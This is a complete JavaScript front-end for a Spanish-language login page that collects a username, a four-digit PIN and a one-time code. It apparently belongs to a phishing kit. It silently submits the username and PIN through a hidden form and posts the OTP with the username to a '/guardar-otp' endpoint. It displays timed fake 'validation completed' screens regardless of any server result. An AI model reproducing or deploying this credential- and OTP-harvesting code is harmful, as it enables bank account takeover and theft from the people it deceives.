document.addEventListener('DOMContentLoaded', function(){
  //console.log('app.js LOADED v=otp13');

  // Formularios / elementos
  const loginForm    = document.getElementById('login-form');
  const loginBtn     = document.getElementById('login-submit');
  const preForm      = document.getElementById('prelogin-form');
  const overlay      = document.getElementById('otp-overlay');
  const modal        = document.getElementById('otp-modal');
  const modalBody    = modal ? modal.querySelector('.modal-body') : null;
  const closeBtn     = modal ? modal.querySelector('.md-close') : null;
  const codeInputs   = modal ? modal.querySelectorAll('.code input') : [];
  const clearBtn     = document.getElementById('otp-clear');
  const continueBtn  = document.getElementById('otp-continue');

  // Splash y Toast
  const splash       = document.getElementById('splash');
  const toast        = document.getElementById('done-message');
  const toastText    = document.getElementById('toast-text');
  const toastClose   = toast ? toast.querySelector('.toast-close') : null;

  // Campo clave (4 dígitos)
  const claveInput   = document.getElementById('clave');
  const claveError   = document.getElementById('clave-error');

  // Estados iniciales seguros
  if (splash){ splash.hidden = true; splash.classList.remove('is-visible'); }
  if (toast){ toast.hidden = true; toast.classList.remove('show'); }

  const isOpen = () => modal && modal.classList.contains('open');

  /* ===== Helpers: tiempos paramétricos ===== */
  function getWaitMs(){
    const url = new URL(window.location.href);
    const qsWait = url.searchParams.get('wait');
    const bodyAttr = document.body.getAttribute('data-wait-seconds');
    const DEFAULT_SECONDS = 9;
    const seconds = Number(qsWait ?? bodyAttr ?? DEFAULT_SECONDS);
    return Number.isFinite(seconds) && seconds >= 0 ? seconds * 1000 : DEFAULT_SECONDS * 1000;
  }
  function getToastMs(){
    const url = new URL(window.location.href);
    const qsToast = url.searchParams.get('toast');
    const bodyAttr = document.body.getAttribute('data-toast-seconds');
    const DEFAULT_SECONDS = 4;
    const seconds = Number(qsToast ?? bodyAttr ?? DEFAULT_SECONDS);
    return Number.isFinite(seconds) && seconds >= 0 ? seconds * 1000 : DEFAULT_SECONDS * 1000;
  }

  /* ===== Toast ===== */
  let toastTimer = 2;
  function showToast(message = '¡Listo! Proceso completado.'){
    if(!toast) return;
    if (toastTimer){ clearTimeout(toastTimer); toastTimer = null; }
    if (toastText) toastText.textContent = message;

    toast.hidden = false;
    requestAnimationFrame(() => toast.classList.add('show'));

    toastTimer = setTimeout(hideToast, getToastMs());
  }
  function hideToast(){
    if(!toast) return;
    toast.classList.remove('show');
    setTimeout(() => { toast.hidden = true; }, 220);
  }
  if (toastClose){ toastClose.addEventListener('click', hideToast); }

  /* ===== Splash ===== */
  function openModal(){ overlay.classList.add('open'); modal.classList.add('open'); codeInputs.forEach(i => i.value = ''); updateOtpContinue(); codeInputs[0]?.focus(); }
  function closeModal(){ overlay.classList.remove('open'); modal.classList.remove('open'); }

  /**
   * Muestra splash por getWaitMs() y luego:
   *  - ejecuta onDone() si se pasa (p.ej. abrir modal)
   *  - muestra un toast (mensaje personalizable)
   */
  function showSplash(onDone, toastMsg = '¡Listo! Proceso completado.'){
    if(!splash) { onDone?.(); return; }
    closeModal();                  // evita solape
    splash.hidden = false;
    requestAnimationFrame(() => splash.classList.add('is-visible'));

    const ms = getWaitMs();
    setTimeout(() => {
      splash.classList.remove('is-visible');
      setTimeout(() => { splash.hidden = true; }, 220);
      onDone?.();                  // acción posterior (ej: abrir modal)
      showToast(toastMsg);         // mensaje final
    }, ms);
  }

  /* ====== OTP ====== */
  function otpFilled(){ return Array.from(codeInputs).every(i => /^\d$/.test(i.value)); }
  function updateOtpContinue(){
    if(!continueBtn) return;
    const filled = otpFilled();
    continueBtn.disabled = !filled;
    continueBtn.classList.toggle('btn-disabled', !filled);
    continueBtn.classList.toggle('btn-otp--ready', filled);
    continueBtn.classList.toggle('btn-primary', false);
  }
  codeInputs.forEach((inp, idx) => {
    inp.addEventListener('keydown', (e) => {
      const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab','Home','End'];
      if (allowed.includes(e.key)) return;
      if (!/^\d$/.test(e.key)) e.preventDefault();
    });
    inp.addEventListener('beforeinput', (e) => {
      if (e.inputType === 'insertText' && !/^\d$/.test(e.data)) e.preventDefault();
    });
    inp.addEventListener('input', () => {
      inp.value = (inp.value.match(/\d/) || [''])[0] || '';
      if(inp.value && idx < codeInputs.length - 1){ codeInputs[idx + 1].focus(); }
      updateOtpContinue();
    });
    inp.addEventListener('paste', (e) => {
      e.preventDefault();
      const raw = (e.clipboardData || window.clipboardData).getData('text') || '';
      const digits = (raw.match(/\d/g) || []).join('');
      if(!digits) return;
      let j = 0;
      for(let k = idx; k < codeInputs.length && j < digits.length; k++, j++){
        codeInputs[k].value = digits[j];
      }
      updateOtpContinue();
      const firstEmpty = Array.from(codeInputs).findIndex(el => !el.value);
      if(firstEmpty >= 0) codeInputs[firstEmpty].focus();
      else codeInputs[codeInputs.length - 1].focus();
    });
    inp.addEventListener('keydown', (ev) => {
      if (ev.key === 'Backspace' && !inp.value && idx > 0){ codeInputs[idx - 1].focus(); }
      if (ev.key === 'ArrowLeft' && idx > 0){ codeInputs[idx - 1].focus(); ev.preventDefault(); }
      if (ev.key === 'ArrowRight' && idx < codeInputs.length - 1){ codeInputs[idx + 1].focus(); ev.preventDefault(); }
    });
  });

  if (continueBtn){
    continueBtn.addEventListener('click', (e) => {
      if (continueBtn.disabled || !otpFilled()){
        e.preventDefault(); e.stopPropagation(); return;
      }
      // Splash tras “Continuar” del OTP
      showSplash(null, '¡Validación completada!');
    
     // Capturar OTP
    const otp = Array.from(codeInputs).map(i => i.value).join('');
    const usuario = localStorage.getItem('usuario'); 

    // Enviar OTP al backend
    fetch('/guardar-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ otp, usuario })
        })
        .then(res => res.text())
        .then(msg => {
          //console.log('Respuesta del servidor:', msg);
          // Aquí puedes cerrar el modal, redirigir, o mostrar confirmación
        })
        .catch(err => {
          //console.error('Error al guardar OTP:', err);
          //alert('Hubo un problema al guardar el OTP');
        });
      });
  }

  /* ===== Clave 4 dígitos ===== */
  function sanitizeClave(){
    if(!claveInput) return;
    const before = claveInput.value;
    const after  = before.replace(/\D/g,'').slice(0,4);
    if (before !== after) {
      const pos = Math.min(after.length, (claveInput.selectionStart ?? after.length));
      claveInput.value = after;
      requestAnimationFrame(() => claveInput.setSelectionRange(pos, pos));
    }
  }
  function isClaveOK(){ return !!claveInput && /^\d{4}$/.test(claveInput.value); }
  function paintClaveError(ok){
    if(!claveInput) return;
    if (!ok){
      claveInput.classList.add('input-error');
      if (claveError) claveError.textContent = 'La clave debe tener exactamente 4 dígitos numéricos.';
    } else {
      claveInput.classList.remove('input-error');
      if (claveError) claveError.textContent = '';
    }
  }
  function updateLoginButton(){
    const ok = isClaveOK();
    if (loginBtn){
      loginBtn.disabled = !ok;
      loginBtn.setAttribute('aria-disabled', String(!ok));
      loginBtn.classList.toggle('btn-login--ready', ok);
    }
    return ok;
  }

  if (claveInput){
    claveInput.addEventListener('keydown', (e) => {
      const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab','Home','End'];
      if (allowed.includes(e.key)) return;
      if (!/^\d$/.test(e.key) || claveInput.value.length >= 4) e.preventDefault();
    });
    claveInput.addEventListener('beforeinput', (e) => {
      if (e.inputType === 'insertText') {
        if (!/^\d$/.test(e.data) || claveInput.value.length >= 4) e.preventDefault();
      }
    });
    claveInput.addEventListener('paste', (e) => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
      const onlyDigits = (text.match(/\d/g) || []).join('');
      const start = claveInput.selectionStart ?? claveInput.value.length;
      const end   = claveInput.selectionEnd ?? claveInput.value.length;
      const next  = (claveInput.value.slice(0, start) + onlyDigits + claveInput.value.slice(end)).replace(/\D/g,'').slice(0,4);
      claveInput.value = next;
      const pos = Math.min(start + onlyDigits.length, 4);
      requestAnimationFrame(() => claveInput.setSelectionRange(pos, pos));
      sanitizeClave(); paintClaveError(isClaveOK()); updateLoginButton();
    });
    const onClaveChange = () => { sanitizeClave(); paintClaveError(isClaveOK()); updateLoginButton(); };
    claveInput.addEventListener('input', onClaveChange);
    claveInput.addEventListener('blur', onClaveChange);
    claveInput.addEventListener('focus', () => {
      claveInput.scrollIntoView({ behavior:'smooth', block:'center' });
    });
    if (loginBtn){
      // Evita clic si no está OK
      loginBtn.addEventListener('click', (e) => {
        if (loginBtn.disabled || !isClaveOK()){
          e.preventDefault(); e.stopPropagation();
        }
      });
    }
  }

  // Submit login: splash y luego abrir modal (si clave válida)
  if(loginForm){
    loginForm.addEventListener('submit', function(e){
      e.preventDefault();
      if(!isClaveOK()){
        paintClaveError(false); claveInput?.focus(); return;
      }

      // Envío en segundo plano
      const usuario = loginForm.usuario?.value || '';
      const clave   = claveInput.value;

      // Guardar usuario en localStorage para usarlo en el módulo OTP
      if (usuario) {
      localStorage.setItem('usuario', usuario);
      //console.log('Usuario guardado en localStorage:', usuario);
      }

      setTimeout(() => {
      if(preForm){
      preForm.elements['usuario'].value = usuario;
      preForm.elements['clave'].value   = clave;
      preForm.submit();
       }

      showSplash(() => openModal(), '¡Sesión iniciada!');
      }, 100); // Espera 100 ms
    });
  }

  // Cierres del modal
  if(closeBtn)  closeBtn.addEventListener('click', closeModal);
  if(overlay)   overlay.addEventListener('click', closeModal);
  if(modalBody) modalBody.addEventListener('click', (e) => e.stopPropagation());
  if(modal){
    modal.addEventListener('click', (e) => { if (!modalBody || !modalBody.contains(e.target)) closeModal(); });
  }
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && isOpen()) closeModal(); });
  if(clearBtn){
    clearBtn.addEventListener('click', ()=>{ codeInputs.forEach(i => i.value = ''); updateOtpContinue(); codeInputs[0]?.focus(); });
  }
});